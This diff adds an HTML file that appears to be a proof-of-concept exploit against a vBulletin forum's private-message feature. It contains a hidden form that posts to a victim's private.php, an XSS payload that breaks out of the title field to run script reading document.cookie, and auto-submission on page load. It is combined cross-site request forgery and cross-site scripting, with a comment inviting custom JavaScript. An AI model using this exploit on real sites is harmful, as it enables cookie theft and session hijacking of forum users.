@@ -1,0 +1,36 @@
+<html>
+<body>
+ <form action="http://[victim]/forum/private.php" method="post"
+name="vbform">
+  <input type="hidden" name="do" value="insertpm" />
+  <input type="hidden" name="pmid" value="" />
+  <input type="hidden" name="forward" value="" />
+  <input type="hidden" name="receipt" value="0" />
+
+  <input type="text" class="bginput" name="title" value="" size="40"
+tabindex="2" />
+  <textarea name="message" rows="20" cols="70" wrap="virtual"
+tabindex="3"></textarea>
+  <input type="submit" class="button" name="sbutton" value="Post Message"
+accesskey="s" tabindex="4" />
+  <input type="submit" class="button" value="Preview Message" accesskey="p"
+name="preview" onclick="this.form.dopreview = true; return
+true;this.form.submit()" tabindex="5" >
+
+  <input type="checkbox" name="savecopy" value="1" id="cb_savecopy"
+checked="checked" />
+  <input type="checkbox" name="signature" value="1" id="cb_signature" />
+  <input type="checkbox" name="parseurl" value="1" id="cb_parseurl"
+checked="checked" />
+  <input type="checkbox" name="disablesmilies" value="1"
+id="cb_disablesmilies" />
+ </form>
+<script>
+ //Set Values and Submit
+ // You can write your own JS codes
+ var xss = "\"><script>alert(document.cookie)<\/script>";
+ document.vbform.title.value=xss;
+ document.vbform.preview.click();
+</script>
+</body>
+</html>
